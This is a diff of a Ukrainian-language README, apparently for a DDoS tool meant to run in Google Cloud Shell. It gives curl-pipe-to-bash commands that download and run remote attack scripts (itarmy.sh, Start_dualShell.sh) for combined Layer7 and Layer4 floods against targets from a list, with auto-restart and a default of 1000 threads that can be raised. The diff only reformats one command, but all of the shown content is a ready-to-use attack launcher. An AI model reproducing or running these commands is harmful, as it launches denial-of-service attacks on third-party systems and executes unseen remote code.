@@ -16,8 +16,10 @@ curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos
 ```
 curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/itarmy.sh | bash
 ```
-~~**Подвійна атака (Layer7+Layer4) розділений термінал (tmux):**~~    
-`curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_dualShell.sh | bash`    
+**Розділений термінал (Layer7+Layer4):**    
+```
+curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_dualShell.sh | bash
+```    
 .    
 :white_check_mark: *Автоперезапуск скриптів, метод атаки додається зі списку цілей, параметр -t за замовчуванням 1000.    
 За потреби параметр -t можна змінити додавши до команди ` -s -- "кількість"`, напр. `-s -- 2000`*    
